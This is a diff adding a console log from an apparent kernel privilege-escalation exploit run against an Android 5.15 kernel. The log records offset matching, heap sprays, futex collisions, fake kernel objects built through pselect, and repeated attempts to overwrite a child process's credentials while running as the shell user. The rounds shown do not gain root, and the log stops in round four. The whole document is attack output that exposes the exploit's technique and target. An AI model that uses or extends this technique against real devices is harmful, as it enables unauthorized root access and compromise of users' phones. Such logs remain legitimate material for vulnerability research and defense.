@@ -1,0 +1,64 @@
+[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
+[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
+[32m[+] [0mstartup context pid=14394 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
+[32m[+] [0mstartup limits pid=14394 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=14394 label=ghostlock_nevada slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=14394 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
+[33m[*] [0m[T+0ms] exploit start
+[32m[+] [0mSELinux already off
+[33m[*] [0m[T+5130ms] pre-W2 drain
+[33m[*] [0mperf task: 0xffffff8011424800 (50/256 votes)
+[33m[*] [0m[T+5335ms] perf_find_task done
+[33m[*] [0mchild_pid=16397 child_task=0xffffff8011424800
+[33m[*] [0mround 1/10: cred write
+[33m[*] [0m=== W2: cred === target=0xffffff8011424f98 mode=2
+[33m[*] [0m[T+10388ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14351..16248] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+19588ms]   heap spray done
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-1 page=ffffff80d0af8000 fake_lock=ffffff80d0af8000 fake_w0=ffffff80d0af8300 fake_task=ffffff80d0af8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=ffffff80d0af8400 ex2=ffffff80d0af8000 ex3=0000000000000003
+[33m[*] [0mpselect pre-select +0ms
+[33m[*] [0mpselect post-select +201ms ret=0
+[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
+[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
+[33m[*] [0m[T+20800ms]   PI route done
+[33m[*] [0mchild uid = 2000
+[33m[*] [0mround 2/10: cred write
+[33m[*] [0m=== W2: cred === target=0xffffff8011424f98 mode=2
+[33m[*] [0m[T+26929ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[14013..15719] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+39902ms]   heap spray done
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-1 page=ffffff80138a8000 fake_lock=ffffff80138a8000 fake_w0=ffffff80138a8300 fake_task=ffffff80138a8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=ffffff80138a8400 ex2=ffffff80138a8000 ex3=0000000000000003
+[33m[*] [0mpselect pre-select +0ms
+[33m[*] [0mpselect post-select +201ms ret=0
+[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
+[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
+[33m[*] [0m[T+41109ms]   PI route done
+[33m[*] [0mchild uid = 2000
+[33m[*] [0mround 3/10: cred write
+[33m[*] [0m=== W2: cred === target=0xffffff8011424f98 mode=2
+[33m[*] [0m[T+50401ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14109..15014] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+61461ms]   heap spray done
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-1 page=ffffff80d3760000 fake_lock=ffffff80d3760000 fake_w0=ffffff80d3760300 fake_task=ffffff80d3760400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=ffffff80d3760400 ex2=ffffff80d3760000 ex3=0000000000000003
+[33m[*] [0mpselect pre-select +0ms
+[33m[*] [0mpselect post-select +201ms ret=0
+[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
+[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
+[33m[*] [0m[T+62669ms]   PI route done
+[33m[*] [0mchild uid = 2000
+[33m[*] [0mround 4/10: cred write
+[33m[*] [0m=== W2: cred === target=0xffffff8011424f98 mode=2
+[33m[*] [0m[T+71340ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14111..14231] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+83354ms]   heap spray done
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-1 page=ffffff8007408000 fake_lock=ffffff8007408000 fake_w0=ffffff8007408300 fake_task=ffffff8007408400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=ffffff8007408400 ex2=ffffff8007408000 ex3=0000000000000003
+[33m[*] [0mpselect pre-select +0ms
